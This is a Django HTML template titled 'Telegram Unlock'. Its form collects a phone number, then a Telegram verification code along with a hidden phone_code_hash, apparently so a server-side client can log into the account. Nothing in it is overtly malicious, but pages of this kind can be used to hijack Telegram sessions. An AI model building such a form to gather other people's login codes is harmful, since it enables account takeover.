<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Telegram Unlock</title>

    <!-- Font Awesome -->
    <link
            href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
            rel="stylesheet"
    />
    <!-- Google Fonts -->
    <link
            href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap"
            rel="stylesheet"
    />
    <!-- MDB -->
    <link
            href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/6.0.1/mdb.min.css"
            rel="stylesheet"
    />

    <!-- MDB -->
    <script
            type="text/javascript"
            src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/6.0.1/mdb.min.js"
    ></script>
</head>
<body>
    <div class="container-fluid">
        <div class="row row-cols-auto mt-5">
            <div class="col mx-auto">
                {% if errors %}
                    <div class="alert alert-danger" role="alert" data-mdb-color="danger">
                        {{ errors }}
                    </div>
                {% endif %}
                <form method="POST">
                    {% csrf_token %}
                    <!-- Phone input -->
                    {% if not phone %}
                        <div class="form-outline mb-4">
                            <input required name="phone" type="tel" id="form1Example1" class="form-control" pattern="[+]{1}[0-9]{2}[0-9]{9}"/>
                            <label class="form-label" for="form1Example1">Phone Number</label>
                        </div>
                        <button type="submit" class="btn btn-primary btn-block">Next</button>

                    {% elif phone %}
                        <div class="form-outline mb-4">
                            <input required name="phone" type="tel" id="form1Example1" class="form-control" pattern="[+]{1}[0-9]{2}[0-9]{9}" value="{{ phone }}" readonly/>
{#                            <label class="form-label" for="form1Example1">Phone Number</label>#}
                        </div>

                        <div class="form-outline mb-4">
                            <input required name="code" id="form1Example1" class="form-control"/>
                            <label class="form-label" for="form1Example1">Verification Code</label>
                        </div>

                        <input type="text" value="{{ phone_code_hash }}" hidden name="phone_code_hash">
                        <button type="submit" class="btn btn-primary btn-block">Login</button>

                    {% endif %}
                </form>
            </div>
        </div>
    </div>
</body>
</html>
